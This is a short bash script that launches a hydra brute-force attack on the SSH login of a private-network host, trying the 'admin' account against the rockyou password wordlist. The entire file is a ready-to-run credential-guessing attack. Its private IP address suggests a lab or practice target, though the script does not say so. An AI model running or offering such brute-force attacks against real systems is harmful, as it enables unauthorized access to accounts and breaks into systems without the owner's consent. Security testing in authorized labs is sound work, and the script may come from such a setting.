#!/bin/bash

TARGET_IP="172.30.0.2"
USER="admin"

echo "[*] Brute-forcing SSH login..."
hydra -l $USER -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP
